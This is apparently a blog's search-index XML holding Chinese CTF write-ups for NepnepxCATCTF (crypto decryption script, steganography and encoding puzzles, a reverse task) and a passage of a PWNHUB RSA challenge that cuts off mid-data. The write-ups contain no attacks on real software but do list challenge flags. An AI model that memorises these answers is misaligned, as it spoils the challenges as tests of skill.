<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/02/09/NepnepxCATCTF/"/>
    <url>/2023/02/09/NepnepxCATCTF/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">layout</span>: hexo<br><span class="hljs-attribute">title</span>: NepnepxCATCTF<br><span class="hljs-attribute">author</span>: J_0k3r<br><span class="hljs-attribute">excerpt</span>: NepnepxCATCTF-Write Up<br><span class="hljs-attribute">banner_img</span>: /img/wp.png<br><span class="hljs-attribute">index_img</span>: /img/catctf.png<br><span class="hljs-attribute">date</span>: 2023-02-05 21:27:32<br><span class="hljs-attribute">categories</span>:<br><span class="hljs-literal">-</span> CTF<br><span class="hljs-literal">-</span> Write Up<br><span class="hljs-attribute">tags</span>:<br><span class="hljs-literal">-</span> Write Up<br><span class="hljs-attribute">sticky</span>: <br></code></pre></td></tr></table></figure><p><a name="ceHvQ"></a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><a name="rgliv"></a></p><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p><img src="/mdimg/NepnepxCATCTF/1.png"><br /><img src="/mdimg/NepnepxCATCTF/2.png"><br><a name="lLkVy"></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><a name="whfyc"></a></p><h3 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h3><p><img src="/mdimg/NepnepxCATCTF/3.png"><br>:::tips<br><strong>1 - 1/3 + 1/5 - 1/7 + …  是求Π/4 近似值的c语言算法     分成4份，所以是派(pie)</strong><br>:::<br> CatCTF{pie}<br><a name="cXq7p"></a></p><h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p><img src="/mdimg/NepnepxCATCTF/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data<br><br>iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) <br>iva=copy(iv)<br>key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>data=pad(data,<span class="hljs-number">16</span>)<br>c=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">16</span>):<br>    s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>    c+=cipher.encrypt(xor(s,iv))<br>    iv=xor(s,c[-<span class="hljs-number">16</span>:])<br><br><br>key=b64encode(key)<br>c=b64encode(c)<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(c)<br><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span><br><span class="hljs-string">b&#x27;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&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>:::tips<br>这段代码实现了对明文数据进行加密，并使用了 AES 加密算法，使用了 ECB 模式。<br />它先生成了一个 16 字节的随机密钥和一个 16 字节的随机初始化向量 (IV)。然后使用这个密钥和 IV 初始化一个 AES 加密器。接着，它对明文数据进行补齐，使其长度是 16 的倍数，并将明文分块。每一块都使用相同的密钥进行加密，但是使用的 IV 是加密的前一块的输出与当前块的异或。<br />最后，将加密的密钥和密文进行 base64 编码，并输出。<br>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 将密钥和密文 base64 解码</span><br>key = b64decode(<span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>)<br>ciphertext = b64decode(<span class="hljs-string">b&#x27;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&#x27;</span><br>)<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>c2 = [ciphertext[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ciphertext),<span class="hljs-number">16</span>)]<br>xor_s = []<br>xor_iv = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ciphertext <span class="hljs-keyword">in</span> c2:<br>    xor_s.append(cipher.decrypt(ciphertext))<br>    <br>s = <span class="hljs-string">b&#x27;&#x27;</span><br>tiv = <span class="hljs-string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">0x99</span>]:<br>    iv = tiv+long_to_bytes(j)<br>    trycry = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor_s)):<br>        s = xor(xor_s[i], iv)<br>        iv = xor(s, c2[i])<br>        <span class="hljs-keyword">try</span>:<br>            trycry += s.decode()<br>            <span class="hljs-keyword">if</span> trycry[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> printable:<br>                <span class="hljs-keyword">break</span><br>            trycry += <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> trycry:   <span class="hljs-comment">#查找关键字flag</span><br>        <span class="hljs-built_in">print</span>(trycry)<br>        <span class="hljs-comment">#flag&#123;This&#x27;s_why_PCBC_is_not_living&#125;</span><br></code></pre></td></tr></table></figure><p><a name="wEvbq"></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><a name="CdyBq"></a></p><h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>图片010打开检索password出密码  catflag<br />然后rabbit密码解密，密钥为catflag<br />然后base91解码<br />最后Ook解码<br /><img src="/mdimg/NepnepxCATCTF/5.png"><br /><img src="/mdimg/NepnepxCATCTF/6.png"><br /><img src="/mdimg/NepnepxCATCTF/7.png"><br><a name="pBbsC"></a></p><h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开<br /><img src="/mdimg/NepnepxCATCTF/8.png"><br>:::tips<br>CatCTF{CAT_GOES_MEOW}<br>:::<br><a name="znyp0"></a></p><h3 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h3><p>010打开检索<br /><img src="/mdimg/NepnepxCATCTF/9.png"><br>:::tips<br>CatCTF{EFI_1sv3ry_funn9}<br>:::<br><a name="AAzOJ"></a></p><h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>foremost分离出一个音频<br /><img src="/mdimg/NepnepxCATCTF/10.png"><br />Audacity打开<br /><img src="/mdimg/NepnepxCATCTF/11.png"><br />得到key：CatCTF<br />DeepSound打开<br /><img src="/mdimg/NepnepxCATCTF/12.png"><br /><img src="/mdimg/NepnepxCATCTF/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 <br></code></pre></td></tr></table></figure><p>兽音解密 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br /><img src="/mdimg/NepnepxCATCTF/14.png"><br><a name="FZXy4"></a></p><h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>打开是GPS数据<br /><img src="/mdimg/NepnepxCATCTF/15.png"><br />参考：<a href="https://blog.csdn.net/jwq2011/article/details/53674125">https://blog.csdn.net/jwq2011/article/details/53674125</a><br />GPS路径可视化<br /><img src="/mdimg/NepnepxCATCTF/16.png"><br>:::tips<br>CatCTF{GPS_M1ao}<br>:::<br><a name="TqEz9"></a></p><h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>一个一个试，试出来是百里玄策</p><p><a name="iX5fH"></a></p><h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>丢linux直接cat flag<br /><img src="/mdimg/NepnepxCATCTF/17.png"><br><a name="Wl3K6"></a></p><h3 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 祝你新年快乐啦！</h3><p><img src="/mdimg/NepnepxCATCTF/18.png"></p><p><a name="D7CNc"></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p><a name="unJt8"></a></p><h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><p><img src="/mdimg/NepnepxCATCTF/19.png"><br /><img src="/mdimg/NepnepxCATCTF/20.png"><br />0~100尝试，必出，结果 0%就出了<br>:::tips<br> CatCTF{<strong>9f1ef07877f9d85a82bd500f408b4814}</strong><br>:::</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022PWNHUB冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 